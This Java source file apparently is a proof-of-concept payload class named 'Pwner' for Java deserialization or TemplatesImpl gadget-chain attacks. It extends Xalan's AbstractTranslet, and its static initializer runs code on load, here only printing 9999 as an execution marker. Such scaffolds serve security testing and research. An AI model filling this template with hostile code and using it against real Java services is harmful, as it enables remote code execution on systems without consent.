import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

public class Pwner extends AbstractTranslet implements Serializable {

    private static final long serialVersionUID = -5971610431559700674L;

    static {
        try {
            System.out.println(9999);
        }catch (Exception e){

        }
    }

    public Pwner() throws Exception{
        namesArray = new String[]{"fuck"};
    }

    public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


    @Override
    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
}
